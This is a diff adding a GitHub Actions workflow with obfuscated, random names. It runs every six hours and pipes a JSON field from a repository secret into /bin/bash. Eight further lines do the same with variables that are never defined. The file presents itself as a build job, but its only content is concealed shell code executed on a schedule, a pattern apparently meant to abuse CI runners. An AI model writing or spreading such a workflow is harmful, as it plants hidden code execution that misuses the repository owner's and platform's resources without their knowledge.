@@ -1,0 +1,24 @@
+name: decayfrightened
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: decayfrightened
+        env:
+          ufyxv79355: ${{ secrets.ufyxv79355 }}
+        run: |
+          echo $ufyxv79355 | jq -r .jxdyk57 | /bin/bash
+          echo $pmri85071 | jq -r .ejf17873 | /bin/bash
+          echo $n9405 | jq -r .ex71 | /bin/bash
+          echo $lntde6075 | jq -r .uv52451 | /bin/bash
+          echo $koje67 | jq -r .lq31 | /bin/bash
+          echo $awxk36 | jq -r .mnyh10375 | /bin/bash
+          echo $cc55029 | jq -r .zplc45 | /bin/bash
+          echo $wzqkf67962 | jq -r .kwdt6890 | /bin/bash
+          echo $vzrun4 | jq -r .mg12 | /bin/bash
+
